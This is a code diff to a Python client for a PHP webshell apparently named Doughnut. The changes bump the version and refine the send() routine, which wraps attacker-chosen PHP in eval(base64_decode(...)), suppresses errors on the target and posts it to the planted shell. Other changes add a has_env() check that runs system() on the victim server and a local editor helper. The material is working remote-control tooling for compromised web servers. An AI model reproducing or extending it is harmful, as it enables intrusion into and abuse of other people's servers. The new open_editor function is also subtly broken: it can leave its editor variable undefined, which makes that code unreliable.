@@ -1,5 +1,7 @@
 import json
+import subprocess
 from base64 import b64encode
+from os import popen
 from random import randint, sample
 from string import ascii_letters, digits
 
@@ -50,7 +52,7 @@ def banner():
 
 """
         )
-    print(color.green("Doughnut Version: 1.3\n"))
+    print(color.green("Doughnut Version: 1.4\n"))
 
 
 def base64_encode(data: str):
@@ -71,13 +73,13 @@ def send(data: str, **extra_params):
         params_dict["data"] = {}
     head = randstr()
     tail = randstr()
-    data = f"""eval('print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
+    data = f"""eval('error_reporting(0);print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
     for func in encode_functions:
         if func in encode_pf:
             data = encode_pf[func].run(data)
     params_dict[raw_key][password] = data
     req = requests.post(url, **params_dict)
-    req.encoding = req.apparent_encoding
+    # req.encoding = req.apparent_encoding
     text = req.text
     content = req.content
     req.r_text = text[text.find(head) + 8: text.find(tail)]
@@ -86,9 +88,9 @@ def send(data: str, **extra_params):
         req.r_json = json.loads(req.r_text)
     except json.JSONDecodeError:
         req.r_json = ''
-    if 1:  # DEBUG
+    if 0:  # DEBUG
         print(f"[debug] {params_dict}")
-        print(f"[debug] [{req}] {req.r_text}")
+        print(f"[debug] [{req}] {text}")
     return req
 
 
@@ -109,13 +111,27 @@ def print_webshell_info():
         print(name + "\n    " + info + "\n")
 
 
-def has_env(env: str):
-    if is_windows():
+def has_env(env: str, remote: bool = True):
+    if is_windows(remote):
         command = "where"
     else:
         command = "whereis"
-    flag = send(f"system('{command} {env}');").r_text
+    if (remote):
+        flag = send(f"system('{command} {env}');").r_text
+    else:
+        flag = popen(f"{command} {env}").read()
     return len(flag)
+
+
+def open_editor(file_path: str):
+    if (has_env("notepad.exe", False)):
+        editor = "notepad.exe" if has_env("notepad.exe") else "vi"
+    try:
+        p = subprocess.Popen([editor, file_path], shell=False)
+        p.wait()
+        return True
+    except FileNotFoundError:
+        return False
 
 
 def print_tree(origin_path: str, tree: dict, depth: int = 0):
